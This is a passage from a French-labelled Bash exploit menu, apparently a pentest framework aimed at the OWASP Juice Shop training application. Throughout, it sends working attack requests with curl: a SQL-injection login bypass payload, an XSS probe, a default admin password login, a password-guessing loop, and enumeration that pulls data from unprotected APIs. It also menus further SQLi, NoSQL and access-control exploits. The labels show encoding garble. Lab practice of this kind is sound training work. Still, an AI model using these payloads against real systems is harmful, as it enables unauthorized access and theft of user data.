                success_count=$((success_count+1))
                break
            else
                echo -e "${RED}âœ—${NC}"
            fi
            
            rm -f "$tmpf"
            sleep 0.2
        done
        
        echo
    done

    if [ $success_count -gt 0 ]; then
        echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
        echo -e "${GREEN}Total weak passwords found: $success_count${NC}"
        echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    else
        echo -e "${RED}âŒ Aucun mot de passe faible trouvÃ©${NC}"
    fi

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 7: Information Disclosure
# ==========================

exploit_info_disclosure() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘     Information Disclosure - API Enum     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Ã‰numÃ©ration APIs non protÃ©gÃ©es${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Exposure de donnÃ©es sensibles${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : API authentication, rate limiting${NC}"
    echo

    check_tools curl jq || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[EXPLOIT] Ã‰numÃ©ration APIs...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local endpoints=(
        "/api/Users"
        "/api/Products"
        "/api/Feedbacks"
        "/api/Complaints"
        "/api/SecurityQuestions"
        "/api/Quantitys"
        "/api/Challenges"
        "/rest/products/search?q="
        "/rest/user/authentication-details"
        "/rest/admin/application-configuration"
    )

    local findings=0

    for ep in "${endpoints[@]}"; do
        echo -e "${CYAN}Testing: $ep${NC}"
        
        local tmpf=$(mktemp)
        local http_code=$(curl -s -o "$tmpf" -w "%{http_code}" "${BASE}${ep}" 2>/dev/null)
        
        echo -e "  HTTP: $http_code"
        
        if [[ "$http_code" =~ ^2 ]]; then
            if cat "$tmpf" | jq '.' >/dev/null 2>&1; then
                findings=$((findings+1))
                
                local count=$(cat "$tmpf" | jq '.data | length' 2>/dev/null)
                
                if [ -n "$count" ] && [ "$count" != "null" ]; then
                    echo -e "  ${GREEN}âœ… Accessible - $count entrÃ©es${NC}"
                    
                    # Afficher aperÃ§u
                    echo -e "  ${YELLOW}Sample:${NC}"
                    cat "$tmpf" | jq '.data[0]' 2>/dev/null | head -n 5 | sed 's/^/    /'
                else
                    echo -e "  ${GREEN}âœ… Accessible${NC}"
                    cat "$tmpf" | jq '.' 2>/dev/null | head -n 5 | sed 's/^/    /'
                fi
                
                log_exploit "${LOG_DIR}/info_disclosure.log" "SUCCESS" "$ep accessible"
            else
                echo -e "  ${YELLOW}âš ï¸  Accessible mais pas JSON${NC}"
            fi
        else
            echo -e "  ${RED}âœ— ProtÃ©gÃ© ou non existant${NC}"
        fi
        
        rm -f "$tmpf"
        echo
        sleep 0.3
    done

    if [ $findings -gt 0 ]; then
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘  âœ… INFO DISCLOSURE FOUND !           â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo -e "${GREEN}Total endpoints exposÃ©s: $findings${NC}"
    else
        echo -e "${RED}âŒ Toutes les APIs protÃ©gÃ©es${NC}"
    fi

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 8: Full Vulnerability Scan
# ==========================

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘      Full Vulnerability Assessment         â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local IP PORT
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [3000]: " PORT; PORT=${PORT:-3000}

    echo -e "\n${YELLOW}[SCAN] DÃ©marrage full scan...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"

    {
        echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
        echo "â•‘    Juice Shop Vulnerability Assessment   â•‘"
        echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo ""
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Target: http://${IP}:${PORT}"
        echo "Scanner: Ghost00ls Framework v7.0"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo ""
    } | tee "$report"

    # Test 1: SQLi Login
    echo -e "${CYAN}[1/7] SQL Injection (Login)...${NC}" | tee -a "$report"
    local sqli=$(curl -s -X POST "http://${IP}:${PORT}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' 2>/dev/null)
    
    echo "$sqli" | jq -r '.authentication.token' 2>/dev/null | grep -q "." \
        && echo "   âœ… VULNERABLE" | tee -a "$report" \
        || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 2: XSS Search
    echo -e "${CYAN}[2/7] XSS (Search)...${NC}" | tee -a "$report"
    local xss=$(curl -s "http://${IP}:${PORT}/rest/products/search?q=%3Cscript%3E" 2>/dev/null)
    echo "$xss" | grep -q "<script>" \
        && echo "   âœ… VULNERABLE" | tee -a "$report" \
        || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 3: Broken Access Control
    echo -e "${CYAN}[3/7] Broken Access Control...${NC}" | tee -a "$report"
    local users=$(curl -s "http://${IP}:${PORT}/api/Users" 2>/dev/null)
    echo "$users" | jq '.' >/dev/null 2>&1 \
        && echo "   âœ… VULNERABLE (API Users accessible)" | tee -a "$report" \
        || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 4: Info Disclosure
    echo -e "${CYAN}[4/7] Information Disclosure...${NC}" | tee -a "$report"
    local info=$(curl -s "http://${IP}:${PORT}/rest/user/authentication-details" 2>/dev/null)
    echo "$info" | jq '.' >/dev/null 2>&1 \
        && echo "   âœ… VULNERABLE (Auth details exposed)" | tee -a "$report" \
        || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 5: Admin Panel
    echo -e "${CYAN}[5/7] Admin Panel Access...${NC}" | tee -a "$report"
    echo "   âš ï¸  CLIENT-SIDE (/#/administration)" | tee -a "$report"

    # Test 6: Weak Passwords
    echo -e "${CYAN}[6/7] Weak Passwords...${NC}" | tee -a "$report"
    local weak=$(curl -s -X POST "http://${IP}:${PORT}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}' 2>/dev/null)
    echo "$weak" | jq -r '.authentication.token' 2>/dev/null | grep -q "." \
        && echo "   âœ… VULNERABLE (admin123)" | tee -a "$report" \
        || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 7: XSS Feedback
    echo -e "${CYAN}[7/7] XSS Stored (Feedback)...${NC}" | tee -a "$report"
    echo "   âš ï¸  MANUAL TEST REQUIRED" | tee -a "$report"

    {
        echo ""
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "Scan terminÃ©: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Rapport: $report"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    } | tee -a "$report"

    echo
    echo -e "${GREEN}âœ… Scan terminÃ© !${NC}"
    echo -e "${CYAN}ğŸ“„ Rapport: $report${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# Menu Principal
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${CYAN}â•‘          Juice Shop Exploits              â•‘${NC}"
        echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        echo -e "${GREEN}1)  ğŸ”“ SQL Injection (Login Bypass)${NC}"
        echo -e "${GREEN}2)  ğŸ’‰ XSS via Search${NC}"
        echo -e "${GREEN}3)  ğŸ’¾ XSS via Feedback (Stored)${NC}"
        echo -e "${GREEN}4)  ğŸšª Broken Access Control${NC}"
        echo -e "${GREEN}5)  ğŸ“Š NoSQL Injection${NC}"
        echo -e "${GREEN}6)  ğŸ”¨ Weak Passwords${NC}"
        echo -e "${GREEN}7)  ğŸ“¡ Information Disclosure${NC}"
        echo -e "${CYAN}8)  ğŸ” Full Vulnerability Scan${NC}"
        echo -e "${MAGENTA}9)  ğŸ“œ Logs${NC}"
        echo -e "${RED}0)  âŒ Retour${NC}"
        echo
        read -p "ğŸ‘‰ Choix : " choice

        case $choice in
            1) exploit_sqli_login ;;
            2) exploit_xss_search ;;
            3) exploit_xss_feedback ;;
            4) exploit_admin_access ;;
            5) exploit_nosql_injection ;;
            6) exploit_weak_passwords ;;
            7) exploit_info_disclosure ;;
            8) full_scan ;;
            9)
                clear
                banner
                echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${CYAN}â•‘              Logs d'Exploits               â•‘${NC}"
                echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
                echo

                for log in "$LOG_DIR"/*.log; do
                    if [ -f "$log" ]; then
                        echo -e "${GREEN}â•â•â• $(basename "$log") â•â•â•${NC}"
                        tail -n 5 "$log"
                        echo
                    fi
                done

                if [ ! "$(ls -A $LOG_DIR/*.log 2>/dev/null)" ]; then
                    echo -e "${YELLOW}Aucun log trouvÃ©${NC}"
                fi

                read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}âŒ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrÃ©e
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
